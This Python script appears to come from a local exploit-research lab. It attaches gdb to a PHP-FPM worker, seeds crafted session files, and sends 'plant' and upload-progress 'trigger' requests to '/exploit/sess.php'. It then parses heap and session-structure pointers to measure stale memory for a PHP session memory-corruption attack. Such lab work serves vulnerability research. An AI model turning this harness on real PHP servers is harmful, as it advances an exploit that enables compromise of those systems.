#!/usr/bin/env python3
"""Plant script OOM, trigger upload-progress, measure stale P/B0 with gb_measure (no CAL RESET)."""
import json, os, re, subprocess, sys, time
LAB = "/tmp/opencode/research/drupal_fpm_20261022T013000Z"
sys.path.insert(0, LAB)
import tool
from tool import field, filepart

WORKER = int(sys.argv[1]) if len(sys.argv)>1 else 156017
SIZE = int(sys.argv[2]) if len(sys.argv)>2 else 65000
GDB = sys.argv[3] if len(sys.argv)>3 else LAB+"/gdb/gb_measure.gdb"
OUT = LAB + "/arms/measure_pt_%d_%d.json" % (WORKER, SIZE)

def current_worker():
    for d in os.listdir('/proc'):
        if not d.isdigit(): continue
        try:
            ppid=int(open('/proc/%s/stat'%d).read().split()[3]); cmd=open('/proc/%s/cmdline'%d,'rb').read().replace(b'\0',b' ').decode('latin1')
        except: continue
        if ppid==144755 and 'pool lab' in cmd: return int(d)
    return None

def benign_record(total):
    L=total-8-len(str(total))
    while True:
        t=8+len(str(L))+L
        if t==total: break
        L+=total-t
    rec=b'x|s:%d:"'%L+b'A'*L+b'";'
    assert len(rec)==total
    return rec

def reqs(lines):
    out={}
    for l in lines:
        m=re.match(r"\[[^]]+\] REQ(\d+) ", l)
        if not m: continue
        n=int(m.group(1)); d=out.setdefault(n,{})
        for key,pat in [
            ('heap', r"PHPRQ_START heap=(0x[0-9a-f]+)"),
            ('X', r"SESSION_DECODE str=(0x[0-9a-f]+) len=(\d+)"),
            ('tmp', r"TMPVAR entry P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+)"),
            ('shutdown', r"SHUTDOWN DAT P=(0x[0-9a-f]+) last_dtor=(0x[0-9a-f]+) first_dtor=(0x[0-9a-f]+) used_slots=(-?\d+) next=(0x[0-9a-f]+) level=(\d+)"),
            ('open', r"PSFILES_OPEN basedir ZSTR ptr=(0x[0-9a-f]+).* len=(\d+) val=(.*)$"),
            ('key', r"PSFILES_OPEN key ZSTR ptr=(0x[0-9a-f]+).* len=(\d+) val=(.*)$"),
            ('write', r"PS_WRITE val=(0x[0-9a-f]+) len=(\d+) head=([0-9a-f]+)"),
            ('flush', r"SESSION_FLUSH status=(\d+)"),
            ('encode', r"ENCODE ret=(0x[0-9a-f]+) len=(\d+) head=([0-9a-f]+)"),
            ('bail', r"ZEND_BAILOUT bg=(0x[0-9a-f]+)/(\d+)"),
        ]:
            mm=re.search(pat,l)
            if mm:
                if key=='X':
                    d.setdefault('decodes',[]).append({'str':int(mm.group(1),16),'len':int(mm.group(2))})
                elif key=='tmp':
                    d['tmp']={'P':int(mm.group(1),16),'last':int(mm.group(2),16),'used':int(mm.group(3)),'next':int(mm.group(4),16)}
                elif key=='shutdown':
                    d['shutdown']={'P':int(mm.group(1),16),'last':int(mm.group(2),16),'first':int(mm.group(3),16),'used':int(mm.group(4)),'next':int(mm.group(5),16),'level':int(mm.group(6))}
                elif key=='open':
                    d['open']={'ptr':int(mm.group(1),16),'len':int(mm.group(2)),'val':mm.group(3)}
                elif key=='key':
                    d['key']={'ptr':int(mm.group(1),16),'len':int(mm.group(2)),'val':mm.group(3)}
                elif key=='write':
                    d['write']={'val':int(mm.group(1),16),'len':int(mm.group(2)),'head':mm.group(3)}
                elif key=='flush': d['flush']=int(mm.group(1))
                elif key=='encode': d['encode']={'ret':int(mm.group(1),16),'len':int(mm.group(2)),'head':mm.group(3)}
                elif key=='bail': d.setdefault('bails',[]).append((int(mm.group(1),16),int(mm.group(2))))
                elif key=='heap': d['heap']=int(mm.group(1),16)
    return out

w=current_worker(); res={'worker0':w,'size':SIZE,'gdb':GDB}
open(tool.GLOG,'w').close()
gout=open(LAB+'/logs/gdb_measure_pt.out','wb')
g=subprocess.Popen(['gdb','-q','--batch','-x',GDB,'-p',str(w)],stdout=gout,stderr=subprocess.STDOUT,cwd=LAB,start_new_session=True)
armed=False
for _ in range(200):
    if os.path.exists(tool.GLOG) and 'armed' in open(tool.GLOG,errors='replace').read(): armed=True; break
    time.sleep(0.1)
res['gdb_armed']=armed
if not armed:
    print(open(LAB+'/logs/gdb_measure_pt.out',errors='replace').read()[-4000:]); raise SystemExit(2)

res['plant_seed']=tool.seed(os.path.join(tool.SESS,'sess_pl1'),tool.PLANT_REC)
n0=tool.req_count()
r=tool.post('/exploit/sess.php',[field('form',b'x')],tag='mpt_plant',timeout=60,cookie='pl1')
res['plant']={'status':r['status'],'head':r['body'][:200].decode('latin1')}
time.sleep(0.8)
res['worker_after_plant']=current_worker()

res['trigger_seed']=tool.seed(os.path.join(tool.SESS,'sess_tb1'),benign_record(SIZE))
n1=tool.req_count()
r=tool.post('/exploit/sess.php',[field('PHP_SESSION_UPLOAD_PROGRESS',b'x'),filepart()],tag='mpt_trigger',timeout=120,cookie='tb1')
res['trigger']={'status':r['status'],'head':r['body'][:240].decode('latin1')}
time.sleep(1.2)
res['worker_after_trigger']=current_worker()
# detach gdb via detach endpoint (zif_zend_version)
try:
    rd=tool.post('/exploit/detach.php',[field('form',b'x')],tag='mpt_detach',timeout=30)
    res['detach']={'status':rd['status'],'head':rd['body'][:80].decode('latin1')}
except Exception as e:
    res['detach']={'err':str(e)}
time.sleep(0.5)
lines=open(tool.GLOG,errors='replace').read().splitlines()
res['reqs']=reqs(lines)
res['plant_req']=res['reqs'].get(n0+1)
res['trigger_req']=res['reqs'].get(n1+1)
res['file']={'len':os.path.getsize(os.path.join(tool.SESS,'sess_tb1'))}
json.dump(res,open(OUT,'w'),indent=1,default=str)
print(json.dumps({k:res.get(k) for k in ('worker0','plant','worker_after_plant','plant_req','trigger','worker_after_trigger','trigger_req','file','detach')},indent=1,default=str))
